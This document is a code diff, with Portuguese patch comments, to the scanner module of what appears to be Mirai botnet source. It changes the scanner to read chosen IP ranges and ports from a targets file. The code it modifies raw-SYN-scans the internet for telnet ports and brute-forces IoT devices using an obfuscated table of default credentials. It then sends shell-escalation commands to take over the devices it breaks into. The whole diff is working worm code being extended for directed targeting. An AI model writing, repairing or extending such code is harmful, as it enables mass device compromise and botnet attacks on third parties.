@@ -34,10 +34,20 @@
 #define SCAN_PORT_COUNT     8
 
 static const uint16_t scan_ports[SCAN_PORT_COUNT] = {23, 2323, 80, 8080, 81, 5555, 7547, 8888};
-static uint32_t target_base[SCAN_MAX_TARGETS];
-static uint32_t target_count[SCAN_MAX_TARGETS];
+
+/* [PATCH] unifica base+count+porta num struct para suportar "ip:porta" no targets.txt */
+struct scan_target {
+    uint32_t base;
+    uint32_t count;
+    uint16_t port;   /* 0 = usar scan_ports[] */
+};
+static struct scan_target targets[SCAN_MAX_TARGETS];
 static uint32_t target_total = 0;
 static int target_loaded = 0;
+
+/* [PATCH] lista de portas válidas para o match de SYN-ACK (array + portas explícitas) */
+static uint16_t valid_ports[SCAN_PORT_COUNT + SCAN_MAX_TARGETS];
+static int valid_ports_count = 0;
 
 int scanner_pid, rsck, rsck_out, auth_table_len = 0;
 char scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};
@@ -47,6 +57,7 @@ uint16_t auth_table_max_weight = 0;
 uint32_t fake_time = 0;
 
 static void load_targets(void);
+static void pick_target(uint32_t *out_ip, uint16_t *out_port);
 static ipv4_t get_random_ip(void);
 
 int recv_strip_null(int sock, void *buf, int len, int flags)
@@ -93,6 +104,19 @@ static void load_targets(void)
         if (*p == 0)
             continue;
 
+        /* [PATCH] aceita "ip:porta" — captura porta explícita antes do parse CIDR */
+        uint16_t explicit_port = 0;
+        char *colon = strrchr(p, ':');
+        if (colon != NULL)
+        {
+            int port = atoi(colon + 1);
+            if (port > 0 && port <= 65535)
+            {
+                explicit_port = (uint16_t)port;
+                *colon = 0;
+            }
+        }
+
         unsigned int a, b, c, d, n = 32;
         int matched = sscanf(p, "%u.%u.%u.%u/%u", &a, &b, &c, &d, &n);
         if (matched < 4)
@@ -109,13 +133,32 @@ static void load_targets(void)
         base &= mask;
         uint32_t count = (n == 32) ? 1u : (uint32_t)(1ull << (32 - n));
 
-        target_base[target_total] = base;
-        target_count[target_total] = count;
+        targets[target_total].base = base;
+        targets[target_total].count = count;
+        targets[target_total].port = explicit_port;
         target_total++;
     }
 
     fclose(f);
     target_loaded = (target_total > 0) ? 1 : 0;
+
+    /* [PATCH] monta lista de portas válidas para o match de SYN-ACK */
+    valid_ports_count = 0;
+    for (int i = 0; i < SCAN_PORT_COUNT; i++)
+        valid_ports[valid_ports_count++] = scan_ports[i];
+
+    for (uint32_t i = 0; i < target_total; i++)
+    {
+        if (targets[i].port == 0)
+            continue;
+        int dup = 0;
+        for (int j = 0; j < valid_ports_count; j++)
+        {
+            if (valid_ports[j] == targets[i].port) { dup = 1; break; }
+        }
+        if (!dup && valid_ports_count < (int)(sizeof(valid_ports) / sizeof(valid_ports[0])))
+            valid_ports[valid_ports_count++] = targets[i].port;
+    }
 }
 
 void scanner_init(void)
@@ -125,7 +168,6 @@ void scanner_init(void)
     struct iphdr *iph;
     struct tcphdr *tcph;
 
-    // Let parent continue on main thread
     scanner_pid = fork();
     if (scanner_pid > 0 || scanner_pid == -1)
         return;
@@ -142,7 +184,6 @@ void scanner_init(void)
         conn_table[i].fd = -1;
     }
 
-    // Set up raw socket scanning and payload
     if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
     {
 #ifdef DEBUG
@@ -170,7 +211,6 @@ void scanner_init(void)
     iph = (struct iphdr *)scanner_rawpkt;
     tcph = (struct tcphdr *)(iph + 1);
 
-    // Set up IPv4 header
     iph->ihl = 5;
     iph->version = 4;
     iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr));
@@ -178,14 +218,12 @@ void scanner_init(void)
     iph->ttl = 64;
     iph->protocol = IPPROTO_TCP;
 
-    // Set up TCP header
     tcph->dest = htons(scan_ports[0]);
     tcph->source = source_port;
     tcph->doff = 5;
     tcph->window = rand_next() & 0xffff;
     tcph->syn = TRUE;
 
-    // Set up passwords
     add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
     add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
     add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
@@ -253,7 +291,6 @@ void scanner_init(void)
     printf("[scanner] Scanner process initialized. Scanning started.\n");
 #endif
 
-    // Main logic loop
     while (TRUE)
     {
         fd_set fdset_rd, fdset_wr;
@@ -261,7 +298,6 @@ void scanner_init(void)
         struct timeval tim;
         int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;
 
-        // Spew out SYN to try and get a response
         if (fake_time != last_spew)
         {
             last_spew = fake_time;
@@ -271,11 +307,15 @@ void scanner_init(void)
                 struct sockaddr_in paddr = {0};
                 struct iphdr *iph = (struct iphdr *)scanner_rawpkt;
                 struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
-                uint16_t dst_port = scan_ports[rand_next() % SCAN_PORT_COUNT];
+
+                /* [PATCH] escolhe IP e porta juntos — porta explícita do target quando existir */
+                uint32_t dst_ip; uint16_t target_port;
+                pick_target(&dst_ip, &target_port);
+                uint16_t dst_port = target_port ? target_port : scan_ports[rand_next() % SCAN_PORT_COUNT];
 
                 iph->id = rand_next();
                 iph->saddr = LOCAL_ADDR;
-                iph->daddr = get_random_ip();
+                iph->daddr = dst_ip;
                 iph->check = 0;
                 iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
 
@@ -290,12 +330,10 @@ void scanner_init(void)
 
                 sendto(rsck, scanner_rawpkt, sizeof (scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof (paddr));
 
-                // Rate limit — cap em SCAN_MAX_PPS independente de SCANNER_RAW_PPS
                 usleep(1000000 / SCAN_MAX_PPS);
             }
         }
 
-        // Read packets from raw socket to get SYN+ACKs
         last_avail_conn = 0;
         while (TRUE)
         {
@@ -311,17 +349,17 @@ void scanner_init(void)
             if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                 break;
 
-            if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
+            if (n < (int)(sizeof(struct iphdr) + sizeof(struct tcphdr)))
                 continue;
             if (iph->daddr != LOCAL_ADDR)
                 continue;
             if (iph->protocol != IPPROTO_TCP)
                 continue;
 
-            // Aceita SYN-ACK de qualquer porta do array de scan
-            for (int p = 0; p < SCAN_PORT_COUNT; p++)
+            /* [PATCH] aceita SYN-ACK de qualquer porta em valid_ports (array + portas explícitas) */
+            for (int p = 0; p < valid_ports_count; p++)
             {
-                if (tcph->source == htons(scan_ports[p]))
+                if (tcph->source == htons(valid_ports[p]))
                 {
                     port_match = 1;
                     break;
@@ -354,7 +392,6 @@ void scanner_init(void)
                 }
             }
 
-            // If there were no slots, then no point reading any more
             if (conn == NULL)
                 break;
 
@@ -366,7 +403,6 @@ void scanner_init(void)
 #endif
         }
 
-        // Load file descriptors into fdsets
         FD_ZERO(&fdset_rd);
         FD_ZERO(&fdset_wr);
         for (i = 0; i < SCANNER_MAX_CONNS; i++)
@@ -384,8 +420,7 @@ void scanner_init(void)
                 close(conn->fd);
                 conn->fd = -1;
 
-                // Retry
-                if (conn->state > SC_HANDLE_IACS) // If we were at least able to connect, try again
+                if (conn->state > SC_HANDLE_IACS)
                 {
                     if (++(conn->tries) == 10)
                     {
@@ -484,7 +519,7 @@ void scanner_init(void)
                         printf("[scanner] FD%d connection gracefully closed\n", conn->fd);
 #endif
                         errno = ECONNRESET;
-                        ret = -1; // Fall through to closing connection below
+                        ret = -1;
                     }
                     if (ret == -1)
                     {
@@ -496,7 +531,6 @@ void scanner_init(void)
                             close(conn->fd);
                             conn->fd = -1;
 
-                            // Retry
                             if (++(conn->tries) >= 10)
                             {
                                 conn->tries = 0;
@@ -547,11 +581,8 @@ void scanner_init(void)
 #ifdef DEBUG
                                 printf("[scanner] FD%d received password prompt\n", conn->fd);
 #endif
-
-                                // Send password
                                 send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
                                 send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
-
                                 conn->state = SC_WAITING_PASSWD_RESP;
                             }
                             break;
@@ -564,8 +595,6 @@ void scanner_init(void)
 #ifdef DEBUG
                                 printf("[scanner] FD%d received shell prompt\n", conn->fd);
 #endif
-
-                                // Send enable / system / shell / sh to session to drop into shell if needed
                                 table_unlock_val(TABLE_SCAN_ENABLE);
                                 tmp_str = table_retrieve_val(TABLE_SCAN_ENABLE, &tmp_len);
                                 send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
@@ -583,7 +612,6 @@ void scanner_init(void)
 #ifdef DEBUG
                                 printf("[scanner] FD%d received sh prompt\n", conn->fd);
 #endif
-
                                 table_unlock_val(TABLE_SCAN_SYSTEM);
                                 tmp_str = table_retrieve_val(TABLE_SCAN_SYSTEM, &tmp_len);
                                 send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
@@ -593,7 +621,7 @@ void scanner_init(void)
                                 conn->state = SC_WAITING_SYSTEM_RESP;
                             }
                             break;
-			case SC_WAITING_SYSTEM_RESP:
+                        case SC_WAITING_SYSTEM_RESP:
                             if ((consumed = consume_any_prompt(conn)) > 0)
                             {
                                 char *tmp_str;
@@ -602,7 +630,6 @@ void scanner_init(void)
 #ifdef DEBUG
                                 printf("[scanner] FD%d received sh prompt\n", conn->fd);
 #endif
-
                                 table_unlock_val(TABLE_SCAN_SHELL);
                                 tmp_str = table_retrieve_val(TABLE_SCAN_SHELL, &tmp_len);
                                 send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
@@ -621,7 +648,6 @@ void scanner_init(void)
 #ifdef DEBUG
                                 printf("[scanner] FD%d received enable prompt\n", conn->fd);
 #endif
-
                                 table_unlock_val(TABLE_SCAN_SH);
                                 tmp_str = table_retrieve_val(TABLE_SCAN_SH, &tmp_len);
                                 send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
@@ -640,8 +666,6 @@ void scanner_init(void)
 #ifdef DEBUG
                                 printf("[scanner] FD%d received sh prompt\n", conn->fd);
 #endif
-
-                                // Send query string
                                 table_unlock_val(TABLE_SCAN_QUERY);
                                 tmp_str = table_retrieve_val(TABLE_SCAN_QUERY, &tmp_len);
                                 send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
@@ -661,7 +685,6 @@ void scanner_init(void)
                                 close(conn->fd);
                                 conn->fd = -1;
 
-                                // Retry
                                 if (++(conn->tries) == 10)
                                 {
                                     conn->tries = 0;
@@ -693,7 +716,6 @@ void scanner_init(void)
                             break;
                         }
 
-                        // If no data was consumed, move on
                         if (consumed == 0)
                             break;
                         else
@@ -744,33 +766,33 @@ static void setup_connection(struct scanner_connection *conn)
     connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
 }
 
-static ipv4_t get_random_ip(void)
+/* [PATCH] pick_target retorna IP e porta associada (0 = usar scan_ports[]) */
+static void pick_target(uint32_t *out_ip, uint16_t *out_port)
 {
-    // Se /tmp/targets.txt existe, scan dirigido por CIDR
     if (target_loaded)
     {
         int i;
         uint32_t total = 0;
-        for (i = 0; i < target_total; i++)
-            total += target_count[i];
+        for (i = 0; i < (int)target_total; i++)
+            total += targets[i].count;
 
-        if (total == 0)
-            goto fallback_random;
-
-        uint32_t r = rand_next() % total;
-        uint32_t acc = 0;
-        for (i = 0; i < target_total; i++)
+        if (total > 0)
         {
-            if (r < acc + target_count[i])
+            uint32_t r = rand_next() % total;
+            uint32_t acc = 0;
+            for (i = 0; i < (int)target_total; i++)
             {
-                uint32_t offset = r - acc;
-                return htonl(target_base[i] + offset);
+                if (r < acc + targets[i].count)
+                {
+                    *out_ip = htonl(targets[i].base + (r - acc));
+                    *out_port = targets[i].port;
+                    return;
+                }
+                acc += targets[i].count;
             }
-            acc += target_count[i];
         }
     }
 
-fallback_random:
     {
         uint32_t tmp;
         uint8_t o1, o2, o3, o4;
@@ -782,23 +804,32 @@ fallback_random:
             o3 = (tmp >> 16) & 0xff;
             o4 = (tmp >> 24) & 0xff;
         }
-        while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
-              (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
-              (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
-              (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
-              (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
-              (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
-              (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
-              (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
-              (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
-              (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
-              (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
-              (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
-              (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
+        while (o1 == 127 ||
+              (o1 == 0) ||
+              (o1 == 3) ||
+              (o1 == 15 || o1 == 16) ||
+              (o1 == 56) ||
+              (o1 == 10) ||
+              (o1 == 192 && o2 == 168) ||
+              (o1 == 172 && o2 >= 16 && o2 < 32) ||
+              (o1 == 100 && o2 >= 64 && o2 < 127) ||
+              (o1 == 169 && o2 > 254) ||
+              (o1 == 198 && o2 >= 18 && o2 < 20) ||
+              (o1 >= 224) ||
+              (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215)
         );
 
-        return INET_ADDR(o1,o2,o3,o4);
+        *out_ip = INET_ADDR(o1,o2,o3,o4);
+        *out_port = 0;
     }
+}
+
+/* wrapper para manter compatibilidade com chamadas antigas */
+static ipv4_t get_random_ip(void)
+{
+    uint32_t ip; uint16_t port;
+    pick_target(&ip, &port);
+    return ip;
 }
 
 static int consume_iacs(struct scanner_connection *conn)
